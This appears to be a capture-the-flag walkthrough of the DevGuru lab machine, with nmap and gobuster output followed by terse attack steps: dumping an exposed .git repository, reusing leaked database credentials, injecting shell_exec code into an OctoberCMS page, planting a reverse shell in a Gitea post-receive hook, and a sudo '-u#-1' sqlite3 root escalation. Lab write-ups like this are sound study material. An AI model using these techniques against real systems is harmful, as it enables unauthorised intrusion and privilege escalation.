[*] DEVGURU [*]

# Date : 05/02/2022

# ->Enumeration Phase:

# Nmap 7.91 scan initiated Sat Feb  5 13:52:14 2022 as: nmap -v -sC -sV -p- -oN nmap_all 192.168.0.115
Nmap scan report for 192.168.0.115
Host is up (0.00015s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e (RSA)
|   256 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 (ECDSA)
|_  256 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: DevGuru
| http-git: 
|   192.168.0.115:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: first commit 
|     Remotes:
|       http://devguru.local:8585/frank/devguru-website.git
|_    Project type: PHP application (guessed from .gitignore)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Corp - DevGuru
8585/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=aa7c8da2ec1f36c1; Path=/; HttpOnly
|     Set-Cookie: _csrf=v0duJll4jots1VIP7mqPw84_8sM6MTY0NDA0OTM0NTY0NjY1MTE1MQ; Path=/; Expires=Sun, 06 Feb 2022 08:22:25 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 05 Feb 2022 08:22:25 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=8e56e8cfab3f9cd3; Path=/; HttpOnly
|     Set-Cookie: _csrf=rTMeZaQzrX_3DvOLmvmTzBojECU6MTY0NDA0OTM0NTcwNzUxNDc3Nw; Path=/; Expires=Sun, 06 Feb 2022 08:22:25 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 05 Feb 2022 08:22:25 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|_    <meta name="description" content="Gitea (Git with a c
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8585-TCP:V=7.91%I=7%D=2/5%Time=61FE33BE%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,2A02,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x
SF:20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;\
SF:x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=aa7c8da2ec1f36c1;\
SF:x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=v0duJll4jots1VIP7mqPw84_
SF:8sM6MTY0NDA0OTM0NTY0NjY1MTE1MQ;\x20Path=/;\x20Expires=Sun,\x2006\x20Feb
SF:\x202022\x2008:22:25\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEORI
SF:GIN\r\nDate:\x20Sat,\x2005\x20Feb\x202022\x2008:22:25\x20GMT\r\n\r\n<!D
SF:OCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-\">\n<head\x2
SF:0data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x20name=\"vi
SF:ewport\"\x20content=\"width=device-width,\x20initial-scale=1\">\n\t<met
SF:a\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\t<title>\
SF:x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea\x20</title>\n\t<link\
SF:x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20crossorigin=\"use-cr
SF:edentials\">\n\t<meta\x20name=\"theme-color\"\x20content=\"#6cc644\">\n
SF:\t<meta\x20name=\"author\"\x20content=\"Gitea\x20-\x20Git\x20with\x20a\
SF:x20cup\x20of\x20tea\"\x20/>\n\t<meta\x20name=\"description\"\x20content
SF:=\"Gitea\x20\(Git\x20with\x20a\x20cup\x20of\x20tea\)\x20is\x20a\x20pain
SF:less")%r(HTTPOptions,212C,"HTTP/1\.0\x20404\x20Not\x20Found\r\nContent-
SF:Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20P
SF:ath=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=8e56e8cfab3
SF:f9cd3;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=rTMeZaQzrX_3DvOLm
SF:vmTzBojECU6MTY0NDA0OTM0NTcwNzUxNDc3Nw;\x20Path=/;\x20Expires=Sun,\x2006
SF:\x20Feb\x202022\x2008:22:25\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20
SF:SAMEORIGIN\r\nDate:\x20Sat,\x2005\x20Feb\x202022\x2008:22:25\x20GMT\r\n
SF:\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-\">\n<
SF:head\x20data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x20na
SF:me=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\">\
SF:n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\t<
SF:title>Page\x20Not\x20Found\x20-\x20\x20Gitea:\x20Git\x20with\x20a\x20cu
SF:p\x20of\x20tea\x20</title>\n\t<link\x20rel=\"manifest\"\x20href=\"/mani
SF:fest\.json\"\x20crossorigin=\"use-credentials\">\n\t<meta\x20name=\"the
SF:me-color\"\x20content=\"#6cc644\">\n\t<meta\x20name=\"author\"\x20conte
SF:nt=\"Gitea\x20-\x20Git\x20with\x20a\x20cup\x20of\x20tea\"\x20/>\n\t<met
SF:a\x20name=\"description\"\x20content=\"Gitea\x20\(Git\x20with\x20a\x20c
SF:");
MAC Address: 08:00:27:3A:AC:5C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb  5 13:53:46 2022 -- 1 IP address (1 host up) scanned in 92.23 seconds


# Gobuster Result:

    /about                (Status: 200) [Size: 18661]
    /services             (Status: 200) [Size: 10032]
    /themes               (Status: 301) [Size: 315] [--> http://192.168.0.115/themes/]
    /0                    (Status: 200) [Size: 12669]                                 
    /modules              (Status: 301) [Size: 316] [--> http://192.168.0.115/modules/]
    /storage              (Status: 301) [Size: 316] [--> http://192.168.0.115/storage/]
    /plugins              (Status: 301) [Size: 316] [--> http://192.168.0.115/plugins/]
    /About                (Status: 200) [Size: 18661]                                  
    /backend              (Status: 302) [Size: 410] [--> http://192.168.0.115/backend/backend/auth]
    /Services             (Status: 200) [Size: 10032]                                              
    /vendor               (Status: 301) [Size: 315] [--> http://192.168.0.115/vendor/]             
    /config               (Status: 301) [Size: 315] [--> http://192.168.0.115/config/]             
    /artisan              (Status: 200) [Size: 1640]                                               
    /bootstrap            (Status: 301) [Size: 318] [--> http://192.168.0.115/bootstrap/]          
    /SERVICES             (Status: 200) [Size: 10032]                                              
    /ABOUT                (Status: 200) [Size: 18661]

>> # On Port : 8585:

    /img                  (Status: 302) [Size: 27] [--> /img]
    /admin                (Status: 302) [Size: 34] [--> /user/login]
    /issues               (Status: 302) [Size: 34] [--> /user/login]
    /css                  (Status: 302) [Size: 27] [--> /css]       
    /avatars              (Status: 302) [Size: 31] [--> /avatars]   
    /js                   (Status: 302) [Size: 26] [--> /js]        
    /vendor               (Status: 302) [Size: 30] [--> /vendor]    
    /fonts                (Status: 302) [Size: 29] [--> /fonts]     
    /explore              (Status: 302) [Size: 37] [--> /explore/repos]
    /debug                (Status: 200) [Size: 160]                    
    /milestones           (Status: 302) [Size: 34] [--> /user/login]   
    /notifications        (Status: 302) [Size: 34] [--> /user/login]   
    /frank                (Status: 200) [Size: 11330]                  
    /Frank                (Status: 200) [Size: 11328]                  
    /healthcheck          (Status: 200) [Size: 26]


>> nmap finds a .git repository.using gittools extract all from .git 
>> download : gittools
>>  Dumper : dump all the data from .git repo
>> Extractor : extract all the files from dumpfile.

>> so i extract all the details in website folder.
>> i found a adminer.php page having mysql login. and also found a database.php file in which creds are present.

    'mysql' => [
            'driver'     => 'mysql',
            'engine'     => 'InnoDB',
            'host'       => 'localhost',
            'port'       => 3306,
            'database'   => 'octoberdb',
            'username'   => 'october',
            'password'   => 'SQ66EBYx4GT3byXH',
            'charset'    => 'utf8mb4',
            'collation'  => 'utf8mb4_unicode_ci',
            'prefix'     => '',
            'varcharmax' => 191,
>> login in mysql portal and change the password of frank user.
>> after changing the frank password,login says frank user account has suspended
>> so run below mysql query and go ahead.

>> # SELECT * FROM backend_user_throttle WHERE is_suspended = 1

>> create a new webpage of name 'shell'.
>> put following code in 'code' section of compiler.

    function onStart()
    {
        $this->page["myVar"] = shell_exec("<Reverse_shell>");
    }
>> and in Markup put below code.
    {{ page.this.myVar }}

>> save the page and click on review button , got a www-data shell.
# ->Exploitation Phase:

>> in /var "app.ini.bak" file is found. in which dbname and password are found.

>> # user : gitea
>> # password : UfFPTF8C8jjxVF2m

>> login into mysql server using above creds and change the password of frank user.
>> and login into gitea service.
>> go to githooks -> post-receive : put a reverse shell
>> update the readme.txt file.
>> got a frank shell.

# user.flag : 22854d0aec6ba776f9d35bf7b0e00217

# ->PostExploitation Phase:

>> run command : sudo -l

    (ALL, !root) NOPASSWD: /usr/bin/sqlite3

>> run : sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'
>> got a root shell.

# root.txt : 96440606fb88aa7497cde5a8e68daf8f
